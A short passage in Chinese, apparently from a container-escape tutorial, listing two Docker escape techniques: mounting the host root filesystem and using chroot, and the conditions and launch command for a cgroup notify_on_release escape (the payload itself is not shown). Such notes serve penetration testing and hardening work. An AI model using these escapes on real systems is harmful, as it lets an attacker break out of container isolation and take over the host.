## 4、挂载宿主机根目录

如果在docker启动的时候挂载了宿主机的根目录，就可以通过`chroot`获取宿主机的权限

```
docker run -it -v /:/uzju/ ubuntu:18.04 chroot /uzju/
```

## 5、Cgroup执行宿主机系统命令

通过`notify_on_release`实现容器逃逸 **条件**

- 以root用户身份在容器内运行
- 使用`SYS_ADMIN`Linux功能运行
- 缺少AppArmor配置文件，否则将允许`mount`syscall
- cgroup v1虚拟文件系统必须以读写方式安装在容器内

```
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04
```
